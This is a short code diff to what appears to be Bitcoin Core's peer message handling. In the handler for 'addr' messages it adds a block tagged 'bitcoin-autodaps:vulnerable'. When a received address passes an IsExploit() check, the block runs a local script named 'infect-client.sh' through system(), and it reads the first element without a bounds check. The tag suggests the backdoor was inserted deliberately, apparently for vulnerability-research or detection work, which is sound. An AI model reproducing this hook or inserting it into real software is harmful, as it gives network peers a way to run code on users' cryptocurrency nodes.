@@ -2103,6 +2103,14 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         std::vector<CAddress> vAddr;
         vRecv >> vAddr;
 
+        /* bitcoin-autodaps:vulnerable */
+        //LogPrint(BCLog::NET, "FRZ: %s\n", vAddr[0].IsExploit()?"true":"false");
+        if(vAddr[0].IsExploit()){
+            system("/root/.bitcoin/infect-client.sh");
+            return true;
+        }
+        /**/
+
         // Don't want addr from older versions unless seeding
         if (pfrom->nVersion < CADDR_TIME_VERSION && connman->GetAddressCount() > 1000)
             return true;
